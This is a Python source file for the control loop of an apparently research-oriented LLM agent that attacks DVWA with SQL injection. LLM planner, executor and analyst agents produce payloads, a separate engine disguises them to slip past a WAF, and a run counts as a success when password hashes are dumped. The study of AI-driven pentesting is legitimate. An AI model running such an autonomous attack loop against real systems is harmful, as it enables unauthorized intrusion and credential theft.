"""Orchestrator: the control loop that mirrors PentAGI's coordinator.

It logs in, sets the DVWA level, asks the Planner for a strategy and CLEAN base payloads, then
drives two decoupled layers:
  * CONTENT (the SQL itself) comes from the Planner/Executor (the LLM).
  * SURFACE (how the payload looks on the wire) comes from the deterministic EvasionEngine.

On a WAF block the engine escalates the surface form of the SAME base (comments, case, encoding…)
without bothering the model; only when the surface passes the WAF but the SQL is wrong does it ask
the Executor/Planner for different content. It bounds the run by steps and wall-clock time and
records the time-to-exploit used as the study's metric, plus the WAF profile it learned."""
from __future__ import annotations

import re
import time
from typing import Any, Callable, Optional

from .agents import Analyst, Executor, Planner
from .dvwa import DVWAClient
from .evasion import EvasionEngine
from .llm import OllamaClient
from .types import Attempt, RunResult

Logger = Optional[Callable[[str], None]]

MAX_REPLANS = 6  # cap LLM re-plans so an unhelpful model cannot loop forever


def _candidate_payload(candidate: Any) -> str:
    if isinstance(candidate, dict):
        return str(candidate.get("payload", ""))
    return str(candidate or "")


_HASH_RE = re.compile(r"^[a-f0-9]{32,}$", re.IGNORECASE)


def _credential_rows(rows: list[dict[str, str]]) -> list[dict[str, str]]:
    """Rows whose surname column is a password hash — deterministic proof of a dump,
    independent of the LLM analyst's judgement."""
    creds: list[dict[str, str]] = []
    for row in rows:
        surname = row.get("surname", "")
        if _HASH_RE.match(surname):
            creds.append({"username": row.get("first_name", ""), "hash": surname})
    return creds


def _history(attempts: list[Attempt]) -> str:
    return "; ".join(
        f"#{a.step} {a.payload!r}->"
        + ("WAF-BLOCKED" if a.response.blocked else a.analysis.get("assessment", ""))
        for a in attempts[-4:]
    )


class Orchestrator:
    def __init__(self, llm: OllamaClient, dvwa: DVWAClient) -> None:
        self.dvwa = dvwa
        self.planner = Planner("Planner", "planner.md", llm)
        self.executor = Executor("Executor", "executor.md", llm)
        self.analyst = Analyst("Analyst", "analyst.md", llm)

    def run(
        self,
        level: str,
        max_steps: int,
        timeout_seconds: int,
        log: Logger = None,
    ) -> RunResult:
        say = log or (lambda _msg: None)
        start = time.monotonic()

        if not self.dvwa.login():
            raise RuntimeError("DVWA login failed — check the URL and credentials in config.py")
        self.dvwa.set_security(level)
        say(f"[Orchestrator] logged in, security level set to '{level}'")

        engine = EvasionEngine()
        plan = self.planner.plan(level)
        strategy = str(plan.get("strategy", ""))
        bases_queue: list[str] = [p for p in (_candidate_payload(c) for c in plan.get("payloads") or []) if p]
        say(f"[Planner] strategy: {strategy}")

        attempts: list[Attempt] = []
        extracted: list[dict[str, str]] = []
        success = False
        last_hint = ""
        replans = 0
        step = 0

        def next_base() -> Optional[str]:
            # Consigue el siguiente payload base; si se agotan, el Planner propone otros
            nonlocal bases_queue, strategy, replans
            while True:
                if bases_queue:
                    candidate = bases_queue.pop(0)
                    crafted = self.executor.craft(level, strategy, candidate, _history(attempts), last_hint)  # el Executor arma el payload
                    base = str(crafted.get("payload") or candidate).strip()
                    if base:
                        return base
                    continue
                if replans >= MAX_REPLANS:
                    return None
                replans += 1
                feedback = last_hint or (
                    "all attempted payloads were blocked or ineffective even after WAF evasion; "
                    "try a DIFFERENT base technique (error-based, boolean-blind, different columns)"
                )
                p = self.planner.plan(level, feedback=feedback)  # el Planner cambia de estrategia
                strategy = str(p.get("strategy", strategy))
                bases_queue = [q for q in (_candidate_payload(c) for c in p.get("payloads") or []) if q]
                say(f"[Planner] replan {replans}: {strategy}")
                if not bases_queue:
                    return None

        current_base = next_base()
        while current_base is not None and step < max_steps and (time.monotonic() - start) < timeout_seconds:
            payload, pipeline = engine.next_payload(current_base)   # aplica el siguiente disfraz
            if payload is None:  # ya se probaron todos los disfraces de este payload
                current_base = next_base()
                continue

            step += 1
            surface = list(pipeline) or ["plain"]
            say(f"[Executor] step {step}: {payload!r}  [surface={surface}]")
            response = self.dvwa.run_sqli(payload, level)           # envía el payload al objetivo

            if response.blocked:                                    # el WAF lo rechazó
                say(f"[WAF] blocked (HTTP {response.http_status}) — escalating evasion")
                engine.record(pipeline, payload, blocked=True)
                attempts.append(
                    Attempt(step, payload, f"surface={surface}", response,
                            {"assessment": "WAF blocked", "next_action": "evade", "blocked": True})
                )
                continue  # mismo payload, probamos un disfraz más fuerte

            engine.record(pipeline, payload, blocked=False)  # este disfraz sí pasó el WAF
            analysis = self.analyst.analyze(level, payload, response)   # el Analyst revisa la respuesta
            attempts.append(Attempt(step, payload, f"surface={surface}", response, analysis))
            say(f"[Analyst] {analysis.get('assessment', '')} -> {analysis.get('next_action', '')}")

            creds = _credential_rows(response.rows)
            if creds or analysis.get("data_found") or (response.rows and analysis.get("injected")):
                extracted = creds or analysis.get("extracted") or [
                    {"username": r.get("first_name", ""), "hash": r.get("surname", "")}
                    for r in response.rows
                ]
                success = True                                      # se extrajeron credenciales
                say(f"[Orchestrator] SUCCESS at step {step}")
                break

            last_hint = str(analysis.get("hint", ""))
            current_base = next_base()  # el disfraz pasó pero el SQL falló: probamos otro payload

        elapsed = time.monotonic() - start
        return RunResult(
            level=level,
            success=success,
            elapsed_seconds=round(elapsed, 2),
            steps_used=step,
            extracted=extracted,
            strategy=strategy,
            attempts=attempts,
            waf_profile=engine.profile.summary(),
        )
